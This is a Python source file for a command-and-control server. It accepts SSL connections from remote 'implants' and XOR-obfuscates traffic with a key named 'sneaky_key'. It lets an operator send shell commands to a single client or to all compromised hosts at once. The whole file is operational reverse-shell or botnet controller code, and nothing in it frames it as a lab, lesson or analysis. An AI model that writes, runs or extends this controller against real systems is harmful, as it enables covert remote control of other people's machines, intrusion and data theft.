import socket
import threading
import sys
import ssl

# Settings
LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 4445
XOR_KEY = b"sneaky_key"  # Must match implant key

clients = {}
lock = threading.Lock()

# XOR encrypt/decrypt
def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def handle_client(client_socket, addr, client_id):
    try:
        print(f"\n[+] Client {client_id} ({addr[0]}:{addr[1]}) connected.\n")

        while True:
            data = client_socket.recv(4096)
            if not data:
                break

            decrypted = xor_encrypt_decrypt(data, XOR_KEY)

            with lock:
                sys.stdout.buffer.write(f"\n[Client {client_id}] ".encode() + decrypted)
                sys.stdout.flush()

    except Exception as e:
        print(f"[!] Exception with client {client_id}: {e}")

    finally:
        with lock:
            print(f"\n[-] Client {client_id} disconnected.")
            if client_id in clients:
                del clients[client_id]
            
            if len(clients) == 1:
                remaining_client_id = next(iter(clients))
                sys.stdout.write(f"\n[>] ({remaining_client_id}) $ ")
                sys.stdout.flush()
        client_socket.close()

def command_sender():
    while True:
        try:
            with lock:
                live_clients = list(clients.keys())

            if not live_clients:
                continue

            if len(live_clients) == 1:
                client_id = live_clients[0]
                cmd = input(f"\n[>] ({client_id}) $ ").strip()
                if not cmd:
                    continue

                command = cmd.encode() + b"\n"
                encrypted = xor_encrypt_decrypt(command, XOR_KEY)

                with lock:
                    clients[client_id].sendall(encrypted)

            else:
                cmd = input("\n[>] Command (format: client_id command OR all command): ").strip()
                if not cmd:
                    continue

                parts = cmd.split(' ', 1)
                if len(parts) != 2:
                    print("[!] Invalid command format.")
                    continue

                target, command = parts
                command = command.encode() + b"\n"
                encrypted_command = xor_encrypt_decrypt(command, XOR_KEY)

                with lock:
                    if target == 'all':
                        for c_id, sock in clients.items():
                            sock.sendall(encrypted_command)
                    else:
                        try:
                            c_id = int(target)
                            if c_id in clients:
                                clients[c_id].sendall(encrypted_command)
                            else:
                                print(f"[!] No such client ID {c_id}")
                        except ValueError:
                            print("[!] Invalid client ID.")

        except Exception as e:
            print(f"[!] Sender error: {e}")

def main():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(10)
    print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT} (SSL)")

    threading.Thread(target=command_sender, daemon=True).start()

    client_counter = 0

    while True:
        client_socket, addr = server.accept()
        ssl_socket = context.wrap_socket(client_socket, server_side=True)

        client_counter += 1
        client_id = client_counter

        with lock:
            clients[client_id] = ssl_socket
            print(f"\n[+] New SSL connection: Client {client_id} from {addr[0]}:{addr[1]}")
            sys.stdout.write("\n[>] Command (format: client_id command OR all command): ")
            sys.stdout.flush()

        client_thread = threading.Thread(target=handle_client, args=(ssl_socket, addr, client_id))
        client_thread.daemon = True
        client_thread.start()

if __name__ == "__main__":
    main()
